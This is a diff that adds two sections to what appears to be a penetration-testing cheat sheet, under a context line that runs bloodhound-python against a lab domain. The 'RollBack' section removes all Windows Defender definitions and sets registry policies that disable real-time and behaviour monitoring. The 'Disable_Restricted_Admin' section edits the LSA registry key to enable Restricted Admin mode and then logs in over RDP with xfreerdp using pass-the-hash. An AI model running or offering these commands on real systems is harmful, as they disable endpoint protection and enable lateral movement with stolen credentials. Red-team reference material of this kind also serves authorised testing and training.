@@ -1506,6 +1506,29 @@ bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local
 
 # Windows
 
+### RollBack
+```
+ “C:\Program Files\Windows Defender\MpCmdRun.exe” -removedefinitions -all
+ 
+ REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f
+
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
+
+```
+<br>
+
+### Disable_Restricted_Admin
+*RDP
+
+```
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin  -Value 0
+xfreerdp /u:admin /pth:HASH /v:<IP> /cert-ignore
+```
+
+
+<br>
+<br>
+
 ### Writeable_paths
 
 ```powershell
